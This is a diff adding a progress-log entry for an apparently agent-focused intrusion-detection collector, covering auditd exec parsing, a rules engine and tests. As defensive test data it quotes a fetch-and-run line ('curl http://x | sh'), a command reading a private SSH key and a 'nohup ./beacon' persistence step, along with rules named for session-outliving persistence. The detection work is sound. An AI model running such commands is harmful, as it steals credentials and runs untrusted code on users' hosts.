@@ -423,3 +423,54 @@
   rules engine; wire a `rules.dir` config and emit matches through the same
   alerting path.
 - **Blocking:** same — repo access + NAME. (Access was slated for today.)
+
+## 2026-09-28 (Mon), ~08:35 ET — Heartbeat 14
+- **Layer 3 telemetry adapter — action events now come from the host.** New
+  `internal/telemetry/`: the missing half of the rules engine. Rules match on
+  actions, but until now nothing produced an action outside of tests.
+- **Primary source: auditd execve.** `ParseAuditLog` groups auditd's multi-line
+  serial events, folds SYSCALL/EXECVE/CWD/PATH into one record, and reassembles
+  argv (short `a0=`/`a1=` form, long `aN_len`/`aN[i]` form, and `\xHH` hex
+  escapes). `AuditRecord.Action()` → `process.exec` with `exe` + `argv` in the
+  detail map the engine already understands. Non-exec syscalls are skipped, not
+  errored — an audit log is a mixed stream by nature.
+- **Two real parser bugs, both caught by tests before shipping.**
+  1. `auditSerial` used `LastIndex(":")` over the whole remainder, so a colon in
+     the *body* (e.g. `exe="/bin/bash"` → the `):` trailer vs a later colon)
+     made every record parse as serial 0 and be dropped. Fixed by locating the
+     closing `)` of the trailer first, then taking digits after the `:` inside
+     it. Symptom was silent: 0 records, no error.
+  2. `strings.Fields` split quoted argv containing spaces, so
+     `a2="curl http://x | sh"` became three argv elements and a rule would miss
+     it. Added a quote-aware `splitAuditFields` used by both field and argv
+     parsing. This is the CARBONATO-class evasion you cannot afford to miss.
+- **Secondary source:** `ParseTextStream` (one process per line, tab/space
+  split) for tests, demos, and any pipeline that can say "what ran" without
+  auditd. Deliberately dumb: no shell parsing.
+- **Tailing, not replaying.** `FileSource` reads from a stored offset, handles
+  log rotation/truncation, and never parses a partial trailing line (auditd may
+  be mid-write). A host with no auditd returns an empty batch — not an error.
+- **Engine seam.** `telemetry.Engine` binds a Source + rules.Engine + host/agent
+  and returns `behavior.rule_match` events. One interface, so eBPF / FIM /
+  control-plane adapters slot in without touching the engine or alerting path.
+- **Collector wiring.** New `behavior:` config block (`rules_dir`, `audit_log`).
+  `collector.NewBehaviorEngine` loads packs (a malformed pack is a startup
+  error, never silent no-op) and the main loop calls `Poll()` each cycle after
+  the file inventory, so a persona edit and the action it triggers are seen in
+  the same tick. Nil engine's `Poll()` is safe — Layer 3 off is a no-op.
+- **Verification:** gofmt + vet clean; **112/112 tests pass** (+14: auditd parse
+  incl. quoted-arg-whole + long-arg reassembly + non-exec skip + garbage-line
+  tolerance, action shape, empty record, text stream incl. comments/blanks,
+  telemetry→rules engine firing the CARBONATO chain, benign ls silence, source
+  error propagation, config behavior block + missing-rules-dir rejection,
+  engine-disabled-is-nil, malformed-pack rejection).
+- **Live e2e (real binary):** built `bin/agentids-collector`, pointed it at a
+  temp agent root + a synthetic audit log, appended a CARBONATO chain
+  (`bash -c "cat ~/.ssh/id_ed25519"`, then `nohup ./beacon`), watched it emit
+  `RULE process.exec carbonato.exec.shell_spawn` + `.ssh_key_heredoc` +
+  `.persist.survives_session`, with a trailing `ls` staying silent.
+- **Next step (heartbeat 15):** ship Layer 3 matches to central — add an ingest
+  path for `behavior.rule_match` events (`cmd/central` `/api/v1/events` for
+  action events, or reuse the existing ingest), thread the collector's
+  `Poll()` events into the alert pipeline so a rule match pages like a drift.
+- **Blocking:** same — repo access + NAME. (Access was slated for today, Sept 28.)
